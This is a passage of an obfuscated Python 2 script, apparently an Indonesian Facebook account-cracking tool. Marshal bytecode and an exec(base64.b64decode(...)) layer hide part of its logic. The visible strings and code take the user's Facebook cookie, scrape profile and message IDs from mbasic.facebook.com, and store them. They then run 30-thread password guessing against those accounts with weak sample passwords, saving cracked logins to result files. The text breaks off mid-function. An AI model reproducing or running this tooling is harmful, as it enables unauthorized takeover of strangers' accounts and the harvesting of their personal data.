00t\x08\x00t\t\x00f\x07\x00\x16\x83\x01\x00}\x01\x00t\n\x00|\x01\x00\x83\x01\x00}\x00\x00t\x0b\x00}\x02\x00Wq\x96\x00\x01\x01\x01d\x03\x00GHt\x0c\x00\x83\x00\x00\x01q\x96\x00Xn\x1e\x00t\n\x00t\r\x00d\x04\x00\x83\x01\x00j\x0e\x00\x83\x00\x00j\x0f\x00\x83\x00\x00\x83\x01\x00}\x00\x00t\x10\x00j\x11\x00d\x05\x00d\x06\x00|\x00\x00d\x07\x00t\x12\x00\x83\x00\x00\x83\x01\x02j\x13\x00}\x03\x00t\x14\x00t\x15\x00j\x16\x00j\x17\x00d\x08\x00|\x03\x00\x83\x02\x00\x83\x01\x00d\t\x00k\x03\x00r\xec\x01t\x18\x00|\x00\x00\x83\x01\x00t\x0b\x00k\x03\x00r\x01\x01t\x19\x00d\n\x00t\x08\x00t\x05\x00f\x02\x00\x16\x83\x01\x00\x01n\x00\x00|\x02\x00t\x0b\x00k\x02\x00r&\x01t\r\x00d\x04\x00d\x0b\x00\x83\x02\x00j\x1a\x00|\x01\x00\x83\x01\x00\x01n\x00\x00t\x03\x00d\x0c\x00t\x04\x00t\x05\x00t\x06\x00t\x08\x00t\t\x00f\x05\x00\x16\x83\x01\x00j\x1b\x00d\r\x00d\x0e\x00\x83\x02\x00}\x04\x00d\x0f\x00t\x04\x00t\x05\x00t\x06\x00t\x07\x00t\x1c\x00t\x07\x00f\x06\x00\x16GHt\x03\x00d\x10\x00t\x04\x00t\x05\x00t\x06\x00t\x08\x00t\t\x00f\x05\x00\x16\x83\x01\x00}\x05\x00|\x05\x00d \x00k\x06\x00r\xb0\x01d\x18\x00t\x08\x00t\x05\x00f\x02\x00\x16GHt\x19\x00\x83\x00\x00\x01n%\x00|\x05\x00d!\x00k\x06\x00r\xd5\x01d\x1d\x00t\x1c\x00t\x05\x00f\x02\x00\x16GHt\x19\x00\x83\x00\x00\x01n\x00\x00t\x1d\x00|\x04\x00|\x00\x00d\x1e\x00|\x05\x00\x17\x83\x03\x00\x01n\'\x00y\x11\x00t\x1e\x00j\x1f\x00d\x04\x00\x83\x01\x00\x01Wn\x07\x00\x01\x01\x01n\x01\x00Xd\x1f\x00GHt\x0c\x00\x83\x00\x00\x01d\x00\x00S("\x00\x00\x00Ni\x01\x00\x00\x00sG\x00\x00\x00\n%s%s%s Supaya bekerja masukan cookie facebook anda\n%s# %sCookie%s > %ss\x19\x00\x00\x00\x1b[1;91m\xe2\x80\xa2 invalid cookies\x04\x00\x00\x00.coks\'\x00\x00\x00https://mbasic.facebook.com/profile.phpR\x02\x00\x00\x00R\x08\x00\x00\x00t\x06\x00\x00\x00logouti\x00\x00\x00\x00s"\x00\x00\x00%s%s gagal saat mendeteksi bahasa.R!\x00\x00\x00s\x18\x00\x00\x00\n%s%s%s Nama file %s>%s R\x1f\x00\x00\x00R \x00\x00\x00s0\x00\x00\x00%s%s%s Example nama orang %s[ %sRomi Ganteng %s]s\x17\x00\x00\x00%s%s%s Sett nama %s> %st\x04\x00\x00\x00romit\x04\x00\x00\x00Romit\x04\x00\x00\x00ROMIs\x0c\x00\x00\x00Romi Afrizals\x0c\x00\x00\x00Romi afrizals\x0c\x00\x00\x00ROMI AFRIZALs\x0c\x00\x00\x00romi afrizals)\x00\x00\x00\n%s%s anak anjing mau crack pake nama gw s\x0c\x00\x00\x00Romi Gantengs\x0c\x00\x00\x00Romi gantengs\x0c\x00\x00\x00ROMI GANTENGs\x0c\x00\x00\x00romi gantengs$\x00\x00\x00\n%s%s memang ganteng dong abang Romis-\x00\x00\x00https://mbasic.facebook.com/search/people/?q=s\x16\x00\x00\x00\x1b[1;91m\xe2\x80\xa2 login fail!(\x07\x00\x00\x00RG\x00\x00\x00RH\x00\x00\x00RI\x00\x00\x00s\x0c\x00\x00\x00Romi Afrizals\x0c\x00\x00\x00Romi afrizals\x0c\x00\x00\x00ROMI AFRIZALs\x0c\x00\x00\x00romi afrizal(\x04\x00\x00\x00s\x0c\x00\x00\x00Romi Gantengs\x0c\x00\x00\x00Romi gantengs\x0c\x00\x00\x00ROMI GANTENGs\x0c\x00\x00\x00romi ganteng( \x00\x00\x00t\x04\x00\x00\x00NoneRE\x00\x00\x00RC\x00\x00\x00R\x0f\x00\x00\x00R\x0c\x00\x00\x00R\r\x00\x00\x00R\x0e\x00\x00\x00t\x01\x00\x00\x00PR\x10\x00\x00\x00R\x11\x00\x00\x00t\x03\x00\x00\x00cvdR4\x00\x00\x00t\x06\x00\x00\x00dumpflR$\x00\x00\x00R+\x00\x00\x00t\x05\x00\x00\x00stripR\x14\x00\x00\x00R\x15\x00\x00\x00R\x16\x00\x00\x00R\x17\x00\x00\x00R*\x00\x00\x00R\x12\x00\x00\x00R2\x00\x00\x00R3\x00\x00\x00t\x04\x00\x00\x00langR\x04\x00\x00\x00R6\x00\x00\x00R"\x00\x00\x00R\x1c\x00\x00\x00t\x05\x00\x00\x00namahR?\x00\x00\x00t\x06\x00\x00\x00remove(\x06\x00\x00\x00t\x04\x00\x00\x00cvdst\x06\x00\x00\x00cookiet\x03\x00\x00\x00newR\x1e\x00\x00\x00t\x03\x00\x00\x00simt\x01\x00\x00\x00s(\x00\x00\x00\x00(\x00\x00\x00\x00s\x02\x00\x00\x00dgRM\x00\x00\x00F\x00\x00\x00sF\x00\x00\x00\x00\x01\x06\x01\x06\x01\x06\x01\x12\x01\x03\x01%\x01\x0c\x01\n\x01\x03\x01\x05\x00\x0e\x02\x1e\x01!\x01!\x01\x12\x01\x17\x02\x0c\x01\x19\x01+\x01\x1b\x01\x1f\x01\x0c\x01\x0f\x00\n\x01\x0c\x01\x0f\x00\n\x01\x17\x02\x03\x01\x11\x01\x03\x01\x04\x01\x05\x01\x07\x01c\x03\x00\x00\x00\x08\x00\x00\x00\x0b\x00\x00\x00C\x00\x00\x00s\x91\x02\x00\x00t\x00\x00|\x00\x00d\x01\x00\x83\x02\x00\x01t\x01\x00j\x02\x00t\x03\x00j\x04\x00|\x02\x00d\x02\x00|\x01\x00d\x03\x00t\x05\x00\x83\x00\x00\x83\x01\x02j\x06\x00d\x04\x00\x83\x02\x00}\x02\x00x\x08\x02|\x02\x00j\x07\x00d\x05\x00d\x06\x00t\x08\x00\x83\x01\x01D]\xf1\x01}\x03\x00d\x07\x00t\t\x00t\n\x00t\x0b\x00t\x0c\x00t\r\x00t\x0e\x00t\x0f\x00t\x00\x00|\x00\x00\x83\x01\x00j\x10\x00\x83\x00\x00j\x11\x00\x83\x00\x00\x83\x01\x00\x83\x01\x00f\x06\x00\x16Gt\x12\x00j\x13\x00j\x14\x00\x83\x00\x00\x01d\x08\x00t\x0e\x00|\x03\x00\x83\x01\x00k\x06\x00r\x1b\x02d\t\x00t\x0e\x00|\x03\x00d\x06\x00\x19\x83\x01\x00k\x06\x00r\xc9\x00qP\x00q\x1b\x02t\x0e\x00|\x03\x00d\x06\x00\x19\x83\x01\x00}\x04\x00d\n\x00|\x04\x00k\x06\x00r\x80\x01|\x03\x00j\x15\x00d\x0b\x00\x83\x01\x00j\x04\x00d\x0c\x00\x83\x01\x00j\x16\x00d\r\x00d\x0e\x00\x83\x02\x00}\x05\x00t\x01\x00j\x17\x00j\x18\x00d\x0f\x00|\x04\x00\x83\x02\x00}\x06\x00t\x0f\x00|\x06\x00\x83\x01\x00d\x10\x00k\x03\x00r\x18\x02d\x0e\x00j\x19\x00|\x06\x00\x83\x01\x00}\x07\x00|\x07\x00t\x00\x00|\x00\x00\x83\x01\x00j\x10\x00\x83\x00\x00k\x06\x00rZ\x01q}\x01t\x00\x00|\x00\x00d\x01\x00\x83\x02\x00j\x1a\x00d\x11\x00|\x07\x00|\x05\x00f\x02\x00\x16\x83\x01\x00\x01q\x18\x02q\x1b\x02t\x01\x00j\x17\x00j\x18\x00d\x12\x00|\x04\x00\x83\x02\x00}\x06\x00|\x03\x00j\x15\x00d\x0b\x00\x83\x01\x00j\x04\x00d\x0c\x00\x83\x01\x00j\x16\x00d\r\x00d\x0e\x00\x83\x02\x00}\x05\x00t\x0f\x00|\x06\x00\x83\x01\x00d\x10\x00k\x03\x00r\x1b\x02d\x0e\x00j\x19\x00|\x06\x00\x83\x01\x00}\x07\x00|\x07\x00t\x00\x00|\x00\x00\x83\x01\x00j\x10\x00\x83\x00\x00k\x06\x00r\xf5\x01q\x18\x02t\x00\x00|\x00\x00d\x01\x00\x83\x02\x00j\x1a\x00d\x11\x00|\x07\x00|\x05\x00f\x02\x00\x16\x83\x01\x00\x01q\x1b\x02n\x00\x00d\x13\x00|\x03\x00j\x06\x00k\x06\x00rP\x00t\x1b\x00|\x00\x00|\x01\x00|\x03\x00d\x06\x00\x19\x83\x03\x00\x01qP\x00qP\x00Wd\x14\x00t\r\x00t\n\x00f\x02\x00\x16GHd\x15\x00t\t\x00t\n\x00t\x0b\x00t\x0c\x00t\r\x00|\x00\x00f\x06\x00\x16GHt\x1c\x00d\x16\x00t\t\x00t\n\x00t\x0b\x00f\x03\x00\x16\x83\x01\x00\x01t\x1d\x00\x83\x00\x00\x01d\x00\x00S(\x17\x00\x00\x00Ns\x02\x00\x00\x00a+R\x02\x00\x00\x00R\x08\x00\x00\x00s\x0b\x00\x00\x00html.parserR\'\x00\x00\x00R(\x00\x00\x00s7\x00\x00\x00\r%s%s%s mengumpulkan id %s> %s%s \x1b[1;97m- mohon tunggu\rs\t\x00\x00\x00<img alt=s\x08\x00\x00\x00home.phps\x0b\x00\x00\x00profile.phpt\x03\x00\x00\x00imgt\x03\x00\x00\x00alts\x11\x00\x00\x00, profile pictureR\x07\x00\x00\x00s\x18\x00\x00\x00/profile\\.php\\?id=(.*?)&i\x00\x00\x00\x00s\x08\x00\x00\x00%s<=>%s\ns\x08\x00\x00\x00/(.*?)\\?s\x17\x00\x00\x00Lihat Hasil Selanjutnyas%\x00\x00\x00\n\n%s%s Succes dump id pencarian nama s$\x00\x00\x00%s%s%s File dump tersimpan %s>%s %s s\x0f\x00\x00\x00\n%s%s%s kembali(\x1e\x00\x00\x00R$\x00\x00\x00R\x12\x00\x00\x00R\x13\x00\x00\x00R\x14\x00\x00\x00R\x15\x00\x00\x00R\x16\x00\x00\x00R\x17\x00\x00\x00R1\x00\x00\x00R4\x00\x00\x00R\x0c\x00\x00\x00R\r\x00\x00\x00R\x0e\x00\x00\x00R\x10\x00\x00\x00R\x1c\x00\x00\x00R)\x00\x00\x00R*\x00\x00\x00R+\x00\x00\x00R,\x00\x00\x00R-\x00\x00\x00R.\x00\x00\x00R/\x00\x00\x00R\x18\x00\x00\x00R"\x00\x00\x00R2\x00\x00\x00R3\x00\x00\x00R5\x00\x00\x00R6\x00\x00\x00RP\x00\x00\x00R\x0f\x00\x00\x00R8\x00\x00\x00(\x08\x00\x00\x00RU\x00\x00\x00R\x1e\x00\x00\x00t\x01\x00\x00\x00bR:\x00\x00\x00t\x01\x00\x00\x00gR\x0b\x00\x00\x00t\x01\x00\x00\x00dt\x02\x00\x00\x00pk(\x00\x00\x00\x00(\x00\x00\x00\x00s\x02\x00\x00\x00dgRP\x00\x00\x00k\x00\x00\x00s<\x00\x00\x00\x00\x01\r\x01-\x01\x1c\x038\x00\r\x01\x12\x01\x16\x01\x06\x02\x10\x01\x0c\x01$\x01\x15\x01\x12\x01\x0f\x01\x18\x01\x03\x02&\x02\x15\x01$\x01\x12\x01\x0f\x01\x18\x01\x03\x02&\x01\x0f\x01\x1b\x01\x0f\x00\x1b\x00\x17\x00N(\x00\x00\x00\x00(\x04\x00\x00\x00R\x00\x00\x00\x00RE\x00\x00\x00RM\x00\x00\x00RP\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00s\x02\x00\x00\x00dgt\x08\x00\x00\x00<module>\x01\x00\x00\x00s\x06\x00\x00\x00\x13=\t\x08\t%(\x02\x00\x00\x00t\x07\x00\x00\x00marshalt\x05\x00\x00\x00loads(\x00\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00s\x02\x00\x00\x00dgt\x08\x00\x00\x00<module>\x03\x00\x00\x00s\x02\x00\x00\x00\x0c\x01(\x02\x00\x00\x00t\x07\x00\x00\x00marshalt\x05\x00\x00\x00loads(\x00\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00s\x02\x00\x00\x00dgt\x08\x00\x00\x00<module>\x03\x00\x00\x00s\x02\x00\x00\x00\x0c\x01'))

exec(base64.b64decode('I0VuY3J5cHQgQnkgUm9taSBBZnJpemFsIChodHRwczovL2dpdGh1Yi5jb20vUk9NSS1BRlJaTCkKCmltcG9ydCBtYXJzaGFsCmV4ZWMobWFyc2hhbC5sb2FkcygnY1x4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwM1x4MDBceDAwXHgwMEBceDAwXHgwMFx4MDBzXHgxN1x4MDBceDAwXHgwMGRceDAwXHgwMGRceDAzXHgwMGRceDAxXHgwMFx4ODRceDAwXHgwMFx4ODNceDAwXHgwMFlaXHgwMFx4MDBkXHgwMlx4MDBTKFx4MDRceDAwXHgwMFx4MDB0XHgwY1x4MDBceDAwXHgwMGR1bXBfbWVzc2FnZWNceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDFceDAwXHgwMFx4MDBCXHgwMFx4MDBceDAwc1x4MWFceDAwXHgwMFx4MDBlXHgwMFx4MDBaXHgwMVx4MDBkXHgwMFx4MDBceDg0XHgwMFx4MDBaXHgwMlx4MDBkXHgwMVx4MDBceDg0XHgwMFx4MDBaXHgwM1x4MDBSUyhceDAyXHgwMFx4MDBceDAwY1x4MDJceDAwXHgwMFx4MDBceDAyXHgwMFx4MDBceDAwXHgwN1x4MDBceDAwXHgwMENceDAwXHgwMFx4MDBzelx4MDBceDAwXHgwMHxceDAxXHgwMHxceDAwXHgwMF9ceDAwXHgwMHRceDAxXHgwMGRceDAxXHgwMHRceDAyXHgwMHRceDAzXHgwMHRceDA0XHgwMHRceDA1XHgwMHRceDA2XHgwMGZceDA1XHgwMFx4MTZceDgzXHgwMVx4MDBqXHgwN1x4MDBkXHgwMlx4MDBkXHgwM1x4MDBceDgzXHgwMlx4MDB8XHgwMFx4MDBfXHgwOFx4MDB8XHgwMFx4MDBqXHgwOFx4MDBkXHgwNFx4MDBrXHgwMlx4MDByU1x4MDB0XHRceDAwfFx4MDFceDAwXHg4M1x4MDFceDAwXHgwMW5ceDAwXHgwMHRcblx4MDB8XHgwMFx4MDBqXHgwOFx4MDBkXHgwNVx4MDBceDgzXHgwMlx4MDBqXHgwYlx4MDBceDgzXHgwMFx4MDBceDAxfFx4MDBceDAwalx4MGNceDAwZFx4MDZceDAwXHg4M1x4MDFceDAwXHgwMWRceDAwXHgwMFMoXHgwN1x4MDBceDAwXHgwME5zXHgxOFx4MDBceDAwXHgwMFxuJXMlcyVzIE5hbWEgZmlsZSVzID4lcyB0XHgwMVx4MDBceDAwXHgwMCB0XHgwMVx4MDBceDAwXHgwMF90XHgwMFx4MDBceDAwXHgwMHRceDAxXHgwMFx4MDBceDAwd3MkXHgwMFx4MDBceDAwaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tL21lc3NhZ2VzKFxyXHgwMFx4MDBceDAwdFx4MDdceDAwXHgwMFx4MDBjb29raWVzdFx0XHgwMFx4MDBceDAwcmF3X2lucHV0dFx4MDFceDAwXHgwMFx4MDBVdFx4MDNceDAwXHgwMFx4MDB0aWx0XHgwMVx4MDBceDAwXHgwME90XHgwMVx4MDBceDAwXHgwME10XHgwMVx4MDBceDAwXHgwMEt0XHgwN1x4MDBceDAwXHgwMHJlcGxhY2V0XHgwMVx4MDBceDAwXHgwMGZSXHgwMFx4MDBceDAwXHgwMHRceDA0XHgwMFx4MDBceDAwb3BlbnRceDA1XHgwMFx4MDBceDAwY2xvc2V0XHgwNFx4MDBceDAwXHgwMGR1bXAoXHgwMlx4MDBceDAwXHgwMHRceDA0XHgwMFx4MDBceDAwc2VsZlJceDA1XHgwMFx4MDBceDAwKFx4MDBceDAwXHgwMFx4MDAoXHgwMFx4MDBceDAwXHgwMHNceDAyXHgwMFx4MDBceDAwZGd0XHgwOFx4MDBceDAwXHgwMF9faW5pdF9fXHgwM1x4MDBceDAwXHgwMHNceDBjXHgwMFx4MDBceDAwXHgwMFx4MDFcdFx4MDMuXHgwMVx4MGZceDAxXHJceDAxXHgxNlx4MDFjXHgwMlx4MDBceDAwXHgwMFx4MDdceDAwXHgwMFx4MDBcblx4MDBceDAwXHgwMENceDAwXHgwMFx4MDBzXHhmZFx4MDFceDAwXHgwMHRceDAwXHgwMHxceDAwXHgwMGpceDAxXHgwMGRceDAxXHgwMFx4ODNceDAyXHgwMFx4MDF0XHgwMlx4MDBqXHgwM1x4MDB0XHgwNFx4MDBqXHgwNVx4MDB8XHgwMVx4MDBkXHgwMlx4MDB0XHgwNlx4MDBceDgzXHgwMFx4MDBkXHgwM1x4MDB8XHgwMFx4MDBqXHgwN1x4MDBceDgzXHgwMVx4MDJqXHgwOFx4MDBkXHgwNFx4MDBceDgzXHgwMlx4MDB9XHgwMlx4MDBkXHgwNVx4MDB0XHRceDAwdFxuXHgwMHRceDBiXHgwMHRceDBjXHgwMHRcclx4MDB0XHgwZVx4MDB0XHgwZlx4MDB0XHgwMFx4MDB8XHgwMFx4MDBqXHgwMVx4MDBceDgzXHgwMVx4MDBqXHgxMFx4MDBceDgzXHgwMFx4MDBqXHgxMVx4MDBceDgzXHgwMFx4MDBceDgzXHgwMVx4MDBceDgzXHgwMVx4MDBmXHgwNlx4MDBceDE2R0h0XHgxMlx4MDBqXHgxM1x4MDBqXHgxNFx4MDBceDgzXHgwMFx4MDBceDAxdFx4MTVceDAwZFx4MDZceDAwXHg4M1x4MDFceDAwXHgwMXhceDE4XHgwMXxceDAyXHgwMGpceDE2XHgwMGRceDA3XHgwMGRceDA4XHgwMHRceDE3XHgwMFx4ODNceDAxXHgwMURdXHgwMVx4MDF9XHgwM1x4MDBkXHRceDAwfFx4MDNceDAwalx4MDVceDAwZFx4MDhceDAwXHg4M1x4MDFceDAwa1x4MDZceDAwcn5ceDAxdFx4MDJceDAwalx4MThceDAwalx4MTlceDAwZFxuXHgwMHxceDAzXHgwMGpceDA1XHgwMGRceDA4XHgwMFx4ODNceDAxXHgwMFx4ODNceDAyXHgwMH1ceDA0XHgwMHlceDgwXHgwMHh5XHgwMHRceDFhXHgwMHxceDA0XHgwMGpceDFiXHgwMFx4ODNceDAwXHgwMFx4ODNceDAxXHgwMERdZVx4MDB9XHgwNVx4MDB8XHgwMFx4MDBqXHgwN1x4MDBqXHgwNVx4MDBkXHgwYlx4MDBceDgzXHgwMVx4MDB8XHgwNVx4MDBrXHgwNlx4MDByXHgxY1x4MDFxXHhmOFx4MDBxXHhmOFx4MDBkXHgwY1x4MDB8XHgwM1x4MDBqXHgwOFx4MDBqXHgxY1x4MDBceDgzXHgwMFx4MDBrXHgwNlx4MDByN1x4MDFxXHhmOFx4MDBuXHgwMFx4MDB0XHgwMFx4MDB8XHgwMFx4MDBqXHgwMVx4MDBkXHgwMVx4MDBceDgzXHgwMlx4MDBqXHgxZFx4MDBkXHJceDAwfFx4MDVceDAwfFx4MDNceDAwalx4MDhceDAwZlx4MDJceDAwXHgxNlx4ODNceDAxXHgwMFx4MDFxXHhmOFx4MDBXV3F+XHgwMVx4MDR0XHgxZVx4MDBrXG5ceDAwcnpceDAxXHgwMX1ceDA2XHgwMFx4MDFxXHhhOVx4MDBxflx4MDFYblx4MDBceDAwZFx4MGVceDAwfFx4MDNceDAwalx4MDhceDAwa1x4MDZceDAwclx4YTlceDAwfFx4MDBceDAwalx4MWZceDAwZFx4MGZceDAwfFx4MDNceDAwalx4MDVceDAwZFx4MDhceDAwXHg4M1x4MDFceDAwXHgxN1x4ODNceDAxXHgwMFx4MDFxXHhhOVx4MDBxXHhhOVx4MDBXZFx4MTBceDAwdFxyXHgwMHRcblx4MDBmXHgwMlx4MDBceDE2R0hkXHgxMVx4MDB0XHRceDAwdFxuXHgwMHRceDBiXHgwMHRceDBjXHgwMHRcclx4MDB8XHgwMFx4MDBqXHgwMVx4MDBmXHgwNlx4MDBceDE2R0h0IFx4MDBkXHgxMlx4MDB0XHRceDAwdFxuXHgwMHRceDBiXHgwMGZceDAzXHgwMFx4MTZceDgzXHgwMVx4MDBceDAxdCFceDAwXHg4M1x4MDBceDAwXHgwMWRceDAwXHgwMFMoXHgxM1x4MDBceDAwXHgwME5zXHgwMlx4MDBceDAwXHgwMGErdFx4MDdceDAwXHgwMFx4MDBoZWFkZXJzUlx4MDVceDAwXHgwMFx4MDBzXHgwYlx4MDBceDAwXHgwMGh0bWwucGFyc2VyczdceDAwXHgwMFx4MDBcciVzJXMlcyBtZW5ndW1wdWxrYW4gaWQgJXM+ICVzJXMgXHgxYlsxOzk3bS0gbW9ob24gdHVuZ2d1XHJne1x4MTRceGFlR1x4ZTF6dD90XHgwMVx4MDBceDAwXHgwMGF0XHgwNFx4MDBceDAwXHgwMGhyZWZzXHgwZVx4MDBceDAwXHgwMC9tZXNzYWdlcy9yZWFkc1x4MTZceDAwXHgwMFx4MDBjaWRcXC5jXFwuKC4qPyklM0EoLio/KSZzXHgwN1x4MDBceDAwXHgwMCBjX3VzZXJzXHgxMVx4MDBceDAwXHgwMHBlbmdndW5hIGZhY2Vib29rc1x4MDhceDAwXHgwMFx4MDAlczw9PiVzXG5zXHgxNlx4MDBceDAwXHgwMExpaGF0IFBlc2FuIFNlYmVsdW1ueWFzXHgxY1x4MDBceDAwXHgwMGh0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS9zJVx4MDBceDAwXHgwMFxuJXMlcyBTdWNjZXMgZHVtcCBpZCBwZXNhbiBtZXNlbmdnZXIgcyRceDAwXHgwMFx4MDAlcyVzJXMgRmlsZSBkdW1wIHRlcnNpbXBhbiAlcz4lcyAlcyBzXHgwZlx4MDBceDAwXHgwMFxuJXMlcyVzIGtlbWJhbGkoIlx4MDBceDAwXHgwMFJceDBlXHgwMFx4MDBceDAwUlxyXHgwMFx4MDBceDAwdFx4MDNceDAwXHgwMFx4MDBiczR0XHJceDAwXHgwMFx4MDBCZWF1dGlmdWxTb3VwdFx4MDhceDAwXHgwMFx4MDByZXF1ZXN0c3RceDAzXHgwMFx4MDBceDAwZ2V0dFx4MDVceDAwXHgwMFx4MDBoZGNva1JceDA1XHgwMFx4MDBceDAwdFx4MDRceDAwXHgwMFx4MDB0ZXh0Ulx4MDdceDAwXHgwMFx4MDBSXHgwOFx4MDBceDAwXHgwMFJcdFx4MDBceDAwXHgwMFJcblx4MDBceDAwXHgwMHRceDAxXHgwMFx4MDBceDAwSHRceDAzXHgwMFx4MDBceDAwc3RydFx4MDNceDAwXHgwMFx4MDBsZW50XHgwNFx4MDBceDAwXHgwMHJlYWR0XG5ceDAwXHgwMFx4MDBzcGxpdGxpbmVzdFx4MDNceDAwXHgwMFx4MDBzeXN0XHgwNlx4MDBceDAwXHgwMHN0ZG91dHRceDA1XHgwMFx4MDBceDAwZmx1c2h0XHgwNFx4MDBceDAwXHgwMGplZGF0XHgwOFx4MDBceDAwXHgwMGZpbmRfYWxsdFx4MDRceDAwXHgwMFx4MDBUcnVldFx4MDJceDAwXHgwMFx4MDByZXRceDA3XHgwMFx4MDBceDAwZmluZGFsbHRceDA0XHgwMFx4MDBceDAwbGlzdHRceDAzXHgwMFx4MDBceDAwcG9wdFx4MDVceDAwXHgwMFx4MDBsb3dlcnRceDA1XHgwMFx4MDBceDAwd3JpdGV0XHRceDAwXHgwMFx4MDBFeGNlcHRpb25SXHgxMFx4MDBceDAwXHgwMFJceDA2XHgwMFx4MDBceDAwdFx4MDRceDAwXHgwMFx4MDBtZW51KFx4MDdceDAwXHgwMFx4MDBSXHgxMVx4MDBceDAwXHgwMHRceDAzXHgwMFx4MDBceDAwdXJsdFx4MDJceDAwXHgwMFx4MDBic3RceDAxXHgwMFx4MDBceDAwaVJcclx4MDBceDAwXHgwMHRceDAyXHgwMFx4MDBceDAwaXB0XHgwMVx4MDBceDAwXHgwMGUoXHgwMFx4MDBceDAwXHgwMChceDAwXHgwMFx4MDBceDAwc1x4MDJceDAwXHgwMFx4MDBkZ1JceDEwXHgwMFx4MDBceDAwXHJceDAwXHgwMFx4MDBzLlx4MDBceDAwXHgwMFx4MDBceDAxXHgxMFx4MDEwXHgwMTxceDAwXHJceDAwXG5ceDAxXHgxY1x4MDFceDE1XHgwMVx4MWVceDAxXHgwM1x4MDFceDE5XHgwMVx4MThceDAxXHgwNlx4MDJceDE1XHgwMVx4MDZceDAxLlx4MDFceDBmXHgwMVxuXHgwMVx4MGZceDAxIVx4MDFceDBmXHgwMVx4MWVceDAxXHgxN1x4MDAoXHgwNFx4MDBceDAwXHgwMHRceDA4XHgwMFx4MDBceDAwX19uYW1lX190XG5ceDAwXHgwMFx4MDBfX21vZHVsZV9fUlx4MTJceDAwXHgwMFx4MDBSXHgxMFx4MDBceDAwXHgwMChceDAwXHgwMFx4MDBceDAwKFx4MDBceDAwXHgwMFx4MDAoXHgwMFx4MDBceDAwXHgwMHNceDAyXHgwMFx4MDBceDAwZGdSXHgwMFx4MDBceDAwXHgwMFx4MDFceDAwXHgwMFx4MDBzXHgwNFx4MDBceDAwXHgwMFx4MDZceDAyXHRcbk4oXHgwMFx4MDBceDAwXHgwMChceDAxXHgwMFx4MDBceDAwUlx4MDBceDAwXHgwMFx4MDAoXHgwMFx4MDBceDAwXHgwMChceDAwXHgwMFx4MDBceDAwKFx4MDBceDAwXHgwMFx4MDBzXHgwMlx4MDBceDAwXHgwMGRndFx4MDhceDAwXHgwMFx4MDA8bW9kdWxlPlx4MDFceDAwXHgwMFx4MDBSXHgwM1x4MDBceDAwXHgwMCcpKQ=='))

def useragent():
	print ("\n%s%s%s 01 %sGanti user agents "%(U,til,P,O))
	print ("%s%s%s 02 %sCek user agents "%(U,til,P,O))
	print ("%s%s%s 00 %sKembali "%(U,til,M,O))
	uas()
	
def uas():
    u = raw_input('\n%s#%s Pilih%s >%s '%(P,O,M,K))
    if u == '':
        print '%s%s wrong input'%(M,til);jeda(2);uas()
    elif u in("1","01"):
    	print ("%s%s%s Ketik %sMy user agent%s di browser google chrome\n%s%s%s untuk gunakan user agent anda sendiri"%(U,til,O,H,O,U,til,O))
    	print ("%s%s%s Ketik %sdefault%s untuk gunakan user agent bawaan tools"%(U,til,O,H,O))
    	try:
    	    ua = raw_input("%s%s%s Enter user agent %s: %s"%(U,til,O,M,K))
            if ua in(""):
            	print ("%s%s isi yang benar "%(M,til));jeda(2);menu()
            elif ua in("my user agent","My User Agent","MY USER AGENT","My user agent"):
            	jalan("%s%s%s Anda akan di arahkan ke browser "%(U,til,O));jeda(2)
            	os.system("am start https://www.google.com/search?q=My+user+agent>/dev/null");jeda(2);useragent()
            elif ua in("default","Default","DEFAULT"):
            	ua_ = ('Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]')
                open("data/ua.txt","w").write(ua_)
                print ("\n%s%s Using the built-in user agent"%(H,til));jeda(2);menu()
            open("data/ua.txt","w").write(ua);jeda(2)
            print ("\n%s%s Successfully changed user agent"%(H,til));jeda(2);menu()
        except KeyboardInterrupt:
			exit ("\x1b[1;91m• Error ") 
    elif u in("2","02"):
        try:
        	ua_ = open('data/ua.txt', 'r').read();jeda(2);print ("%s%s%s user agent anda : %s%s"%(U,til,O,H,ua_));jeda(2);raw_input("%s%s%s kembali "%(U,til,O));menu()
        except IOError:
        	ua_ = '%s-'%(M)
    elif u in("0","00"):
    	menu()
    else:
        print '%s%s wrong input'%(M,til);jeda(2);uas()

class ngentod:

    def __init__(self):
        self.id = []

    def askk(self):
        try:
            self.apk = raw_input('\n%s%s%s file dump %s> %s'%(U,til,O,M,K))
            self.id = open(self.apk).read().splitlines()
            print '%s%s%s jumlah Id%s > %s%s' %(U,til,O,M,H,len(self.id))
        except:
            print '\n%s%s file dump :%s tidak ada\n%s%s lo harus dump id dlu lah '%(M,til,self.apk,M,til);jeda(3);menu()
        rom = raw_input('%s%s%s gunakan password manual? y/t%s > %s'%(U,til,O,M,K))
        if rom in ('Y', 'y'):
            print ('\n%s%s%s contoh%s >%s sayang%s,%spengen%s,%sngentot'%(U,til,O,M,O,M,O,M,O))
            while True:
                pwek = raw_input('%s%s%s password %s> %s'%(U,til,O,M,K))
                if pwek == '':
                    print("%s%s Jangan kosong"%(M,til))
                elif len(pwek)<=5:
                    print ('%s%s sandi minimal 6 karakter'%(M,til))
                else:
                    def xxh(xxnx=None):
                        skm = raw_input('\n%s#%s Pilih %s> %s '%(P,O,M,K))
                        if skm in(""):
                            print '%s%s isi yg benar sayang'%(M,til);self.xxh()
                        elif skm in("1","01"):
                            print '\n%s%s%s akun %s[OK] %stersimpan ke file %s> %shasil/OK-%s-%s-%s.txt'%(U,til,O,H,O,M,H,ha, op, ta);jeda(0.2)
                            print '%s%s%s akun %s[%sCP%s]%s tersimpan ke file %s> %shasil/CP-%s-%s-%s.txt'%(U,til,O,M,K,M,O,M,K,ha, op, ta);jeda(0.2)
                            print('%s!%s crack berjalan, tekan CTRL+Z untuk stop\n'%(U,O));jeda(0.2)
                            with Lampung(max_workers=30) as njir:
                                for uh in self.id:
                                    try:
                                        ah = uh.split('<=>')[0]
                                        njir.submit(self.api, ah, xxnx)
                                    except: pass
                            os.remove(self.apk)
                            exit("\n%s%s finished "%(H,til))
                        elif skm in("2","02"):
